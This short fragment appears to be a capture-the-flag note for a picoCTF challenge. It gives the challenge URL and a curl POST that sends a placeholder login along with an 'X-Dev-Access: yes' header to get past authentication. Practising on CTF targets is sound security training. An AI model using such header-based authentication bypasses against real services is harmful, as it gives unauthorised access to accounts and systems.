http://amiable-citadel.picoctf.net:59797/
curl -s -X POST "http://amiable-citadel.picoctf.net:59797/" \
  -H "Content-Type: application/json" \
  -H "X-Dev-Access: yes" \
  -d '{"email":"ctf-player@picoctf.org","password":"whatever"}'
